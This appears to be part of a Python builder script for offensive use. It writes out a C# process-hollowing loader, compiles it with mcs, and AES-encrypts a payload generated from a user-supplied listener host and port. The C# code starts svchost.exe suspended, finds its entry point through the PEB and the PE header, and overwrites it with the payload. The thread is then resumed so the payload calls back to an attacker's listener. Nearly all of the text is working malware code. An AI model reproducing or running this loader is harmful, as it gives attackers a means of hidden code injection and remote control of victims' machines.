            bool cResult = cp(null, "c:\\\\windows\\\\system32\\\\svchost.exe", IntPtr.Zero, IntPtr.Zero,
                false, STRUCTS.CREATE_SUSPENDED, IntPtr.Zero, null, ref sInfo, out pInfo);
            Console.WriteLine($"Started 'svchost.exe' in a suspended state with PID {{pInfo.ProcessId}}. Success: {{cResult}}.");

            // Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)
            STRUCTS.ProcessBasicInfo pbInfo = new STRUCTS.ProcessBasicInfo();
            uint retLen = new uint();

            pointer = Invoke.GetLibraryAddress("ntdll.dll", "ZwQueryInformationProcess");
            DELEGATES.ZwQueryInformationProcess zqip = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ZwQueryInformationProcess)) as DELEGATES.ZwQueryInformationProcess;

            long qResult = zqip(pInfo.hProcess, STRUCTS.PROCESSBASICINFORMATION, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + 0x10);
            Console.WriteLine($"Got process information and located PEB address of process at {{"0x" + baseImageAddr.ToString("x")}}. Success: {{qResult == 0}}.");

            // Get entry point of the actual process executable
            // This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))
            // From the PEB (address we got in last call), we have to do the following:
            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!

            // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
            byte[] procAddr = new byte[0x8];
            byte[] dataBuf = new byte[0x200];
            IntPtr bytesRW = new IntPtr();

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "ReadProcessMemory");
            DELEGATES.ReadProcessMemory rpm = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ReadProcessMemory)) as DELEGATES.ReadProcessMemory;

            bool result = rpm(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, out bytesRW);
            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = rpm(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, out bytesRW);
            Console.WriteLine($"DEBUG: Executable base address: {{"0x" + executableAddress.ToString("x")}}.");

            // 2. Read the field 'e_lfanew', 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
            Console.WriteLine($"DEBUG: e_lfanew offset: {{"0x" + e_lfanew.ToString("x")}}.");

            // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
            uint rvaOffset = e_lfanew + 0x28;
            Console.WriteLine($"DEBUG: RVA offset: {{"0x" + rvaOffset.ToString("x")}}.");

            // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            Console.WriteLine($"DEBUG: RVA value: {{"0x" + rva.ToString("x")}}.");

            // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);
            Console.WriteLine($"Got executable entrypoint address: {{"0x" + entrypointAddr.ToString("x")}}.");

            pointer = Invoke.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
            DELEGATES.WriteProcessMemory wpm = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.WriteProcessMemory)) as DELEGATES.WriteProcessMemory;

            // Overwrite the memory at the identified address to 'hijack' the entrypoint of the executable
            result = wpm(pInfo.hProcess, entrypointAddr, pie, pie.Length, out bytesRW);
            Console.WriteLine($"Overwrote entrypoint with payload. Success: {{result}}.");

            // Resume the thread to trigger our payload
            pointer = Invoke.GetLibraryAddress("kernel32.dll", "ResumeThread");
            DELEGATES.ResumeThread rt = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;

            uint rResult = rt(pInfo.hThread);
            Console.WriteLine($"Triggered payload. Success: {{rResult == 1}}. Check your listener!");

        }}
    }}
}}
"""

    # Write the C# content to a file
    cs_file = "AES_Hollow.cs"
    with open(cs_file, "w") as f:
        f.write(cs_content)

    # Write the C# content to a file
    cs_file = "AES_Hollow.cs"
    with open(cs_file, "w") as f:
        f.write(cs_content)

    # Random executable name based on the generated noun
    exe_name = f"{noun}.exe"
    print(f"{GREEN}[+] Writing C# code to {cs_file}{NC}")
    
    # Compile the C# code into an executable using mcs
    print(f"{GREEN}[+] Compiling to {exe_name}{NC}")
    os.system(f"mcs -out:{exe_name} {cs_file}")
    
    print(f"{GREEN}[+] Compilation complete. Generated file: {exe_name}{NC}")

def main():
    display_banner()

    # Step 1: Get user inputs including the optional payload file path
    lhost, lport, payload, payload_file_path = prompt_for_input()  # Unpack 4 values

    # Step 2: Generate the payload if no payload.raw file was provided
    if not payload_file_path:
        progress_bar("Generating payload", duration=3)
        generate_payload(lhost, lport, payload)
        payload_file_path = "payload.raw"  # Assuming this is the default file it generates

    # Step 3: Generate AES encryption key and encrypt the payload (either provided or generated)
    key = generate_key()
    print(f"{GREEN}[+] Generated AES Key: {key}{NC}")
    
    # Use the correct file path provided by the user or the generated one
    size, encrypted_data = encrypt_payload_to_byte_array_with_size(key, payload_file_path)

    # Step 4: Write C# file and compile it
    progress_bar("Encrypting payload", duration=3)
    generate_cs_file(key, encrypted_data, size)

    progress_bar("Finalizing", duration=2)
    print(f"{GREEN}[+] Task Completed. Exiting.{NC}")

if __name__ == "__main__":
    main()

